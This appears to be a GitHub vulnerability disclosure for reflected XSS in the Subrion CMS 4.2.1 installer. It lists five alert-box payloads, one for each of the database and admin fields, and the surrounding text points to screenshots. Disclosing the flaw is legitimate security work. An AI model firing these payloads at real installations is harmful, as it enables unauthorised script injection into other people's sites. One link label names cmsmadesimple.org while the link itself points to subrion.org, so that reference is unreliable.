# Subrion CMS Reflected XSS v4.2.1

## Author: (Sergio)

**Description:** Multiple Cross-Site Scripting (XSS) vulnerabilities in installation of Subrion CMS v.4.2.1 allows a local attacker to execute arbitrary web scripts via a crafted payload injected into the dbhost, dbname, dbuser, adminusername and adminemail.

**Attack Vectors:** A vulnerability in the installation sanitation in the dbhost, dbname, dbuser, adminusername and adminemail allows JavaScript code to be injected.

---

### POC:


During the installation process we enter the XSS payload in any of the 5 fields and when we click on next, we will obtain the XSS pop-up

### XSS Payload:

```js
'"><svg/onload=alert('dbhost')>
```

### XSS Payload:

```js
'"><svg/onload=alert('dbname')>
```

### XSS Payload:

```js
'"><svg/onload=alert('dbuser')>
```

### XSS Payload:

```js
'"><svg/onload=alert('adminusername')>
```

### XSS Payload:

```js
'"><svg/onload=alert('adminemail')>
```

![XSS Instalación payload](https://github.com/sromanhu/Subrion-CMS-Reflected-XSS---Installation/assets/87250597/3e00a5cc-02cd-48d5-b345-f8b6fa5192ad)


In the following image you can see the embedded code that executes the payload in the instalaltion process.

![dbhost](https://github.com/sromanhu/Subrion-CMS-Reflected-XSS---Installation/assets/87250597/a8e17a97-162e-45e3-8d82-995b6dd2ec94)


![dbname](https://github.com/sromanhu/Subrion-CMS-Reflected-XSS---Installation/assets/87250597/29515a9d-2d45-4246-9c91-0e2b21bd7158)


![dbuser](https://github.com/sromanhu/Subrion-CMS-Reflected-XSS---Installation/assets/87250597/698ab3b6-13c4-4e98-bbd0-7856fd5108cd)


![adminusername](https://github.com/sromanhu/Subrion-CMS-Reflected-XSS---Installation/assets/87250597/d4f70afd-2914-4615-9878-e3b7acc4ac8b)


![adminemail](https://github.com/sromanhu/Subrion-CMS-Reflected-XSS---Installation/assets/87250597/2e587653-b1f5-4a08-99f8-89cf18c53edb)



</br>

### Additional Information:

[http://www.cmsmadesimple.org/](https://subrion.org/)

https://owasp.org/Top10/es/A03_2021-Injection/

